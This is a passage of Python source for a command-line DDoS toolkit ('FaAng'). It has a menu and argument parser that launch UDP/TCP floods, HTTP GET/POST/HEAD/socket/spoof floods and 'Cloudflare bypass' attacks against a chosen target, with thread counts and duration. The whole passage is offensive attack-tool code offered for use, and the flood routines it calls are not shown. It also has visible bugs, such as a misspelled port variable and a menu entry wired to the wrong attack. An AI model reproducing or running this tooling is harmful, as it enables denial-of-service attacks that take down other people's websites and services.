    indexSelect = input(Fore.MAGENTA+" [?] "+Fore.RESET+"Select : ")
    if indexSelect.upper() == "00":
        StartTitle(f"About This Script") 
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Script Creator : {Fore.RED}D{Fore.YELLOW}x{Fore.GREEN}4")
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Support : F4Z")
        print(Fore.YELLOW+ " [!] " + Fore.RESET + f"Thanks to : Github, {Fore.BLUE}Allah{Fore.RESET}, Microsoft, Python, F4Z") 
    elif indexSelect.upper() == "000":
        StartTitle(f"Exitt") 
        os.remove(LOGIN_FILE)
        print(Fore.MAGENTA + " [!] " + Fore.RESET + f"Logged Out")
        sys.exit()
    elif indexSelect.upper() == "0":
        StartTitle(f"Exit") 
        sys.exit()
    elif indexSelect.upper() == "1":
        StartTitle(f"Layer4 {Back.MAGENTA}UDP{Back.RESET}")
        DdosUDP()
    elif indexSelect.upper() == "2":
        StartTitle(f"Layer4 {Back.MAGENTA}TCP{Back.RESET}")
        DdosTCP()
    elif indexSelect.upper() == "3":
        StartTitle(f"Request GET DDoS")
        DdosGET()
    elif indexSelect.upper() == "4":
        StartTitle(f"Requests POST DDoS")
        DdosPOST()
    elif indexSelect.upper() == "5":
        StartTitle(f"Socket Ddos")
        DdosSOC()
    elif indexSelect.upper() == "6":
        StartTitle(f"HTTP 2.0 Spoof")
        DdosSOC()
    elif indexSelect.upper() == "7":
        StartTitle(f"HTTP Spoof Socket")
        DdosSPOOF()
    elif indexSelect.upper() == "8":
        StartTitle(f"Head Request")
        DdosHEAD()
    elif indexSelect.upper() == "9":
        StartTitle(f"Sky Method")
        DdosSKY()
    elif indexSelect.upper() == "10":
        StartTitle(f"CFRequest Bypass DDoS")
        DdosCFREQ()
    elif indexSelect.upper() == "11":
        StartTitle(f"CFSocket Bypass DDoS")
        DdosCFSOC()
    elif indexSelect.upper() == "12":
        StartTitle(f"CF Bypass DDoS")
        DdosCFB()
    else:
        print(f"{Fore.RED} [*] {Fore.RESET}Invalid menu")
        time.sleep(1) 
        start() 
        
def main():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_dir, 'resources', 'ua.txt') 
    with open(file_path, 'r') as file:
        ua = file.read().split("\n") 
    parser = argparse.ArgumentParser(description="FaAng Toolkit for DDoS pentest", usage="faang [-l4] [method] [target] [thread] [proxy]\n   or: faang [-l7] [method] [target] [thread] [proxy]")
    parser.add_argument("method", type=str, nargs='?', default="",
                        help="Ddos method")
    parser.add_argument("target", type=str, nargs='?', default="",
                        help="Url target, ex : http://example.com/")
    parser.add_argument("thread", type=str, nargs='?', default="",
                        help="Thread for attack target")
    parser.add_argument("time", type=str, nargs='?', default="",
                        help="Time for end attack (sec)")
                        
                        
    parser.add_argument("-l4", "--layer4", action="store_true", help="Layer4 ddos method")
    parser.add_argument("-l7", "--layer7", action="store_true", help="Layer7 ddos method")
    parser.add_argument("-u", "--uninstall", action="store_true", help="Uninstall script")
    
    args = parser.parse_args()
    method = args.method
    target = args.target
    t = args.time
    thread = args.thread
    
    if args.uninstall:
        os.system("faang-uninstaller") 
        sys.exit()
    
    if args.layer4:
        StartTitle(f"Layer 4 : {method}")
        if args.method == "udp":
            splitTarget = args.target.split(":")
            targetIp = splitTarget[0]
            tergetPort = splitTarget[1]
            
            threading.Thread(target=runsender, args=(targetIp, targetPort, args.time, args.thread,"")).start()
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            timer.join()
        elif args.method == "tcp":
            splitTarget = args.target.split(":")
            targetIp = splitTarget[0]
            tergetPort = splitTarget[1]
            
            threading.Thread(target=runsender, args=(targetIp, targetPort, args.time, args.thread,"")).start()
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Invalid method")
        
    elif args.layer7:
        StartTitle(f"Layer 7 : {method}")
        if args.method == "get":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchGET(target, thread, t)
            timer.join()
        elif args.method == "post":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchPOST(target, thread, t)
            timer.join()
        elif args.method == "socket":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchSOC(target, thread, t)
            timer.join()
        elif args.method == "http2":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchHTTP2(target, thread, t)
            timer.join()
        elif args.method == "spoof":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchSPOOF(target, thread, t)
            timer.join()
        elif args.method == "head":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchHEAD(target, thread, t)
            timer.join()
        elif args.method == "sky":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchSKY(target, thread, t)
            timer.join()
        elif args.method == "cfreq":
            if get_cookie(target):
                timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
                timer.start()
                LaunchCFPRO(target, thread, t)
                timer.join()
            else:
                print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset")
        elif args.method == "cfsoc":
            if get_cookie(target):
                timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
                timer.start()
                LaunchCFSOC(target, thread, t)
                timer.join()
            else:
                print(f"{Fore.RED} [*] {Fore.RESET}Cookie reset")
        elif args.method == "cfb":
            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
            timer.start()
            LaunchCFB(target, thread, t)
            timer.join()
        else:
            print(f"{Fore.RED} [*] {Fore.RESET}Invalid method")
    else:
        login()

if __name__ == '__main__':
    main()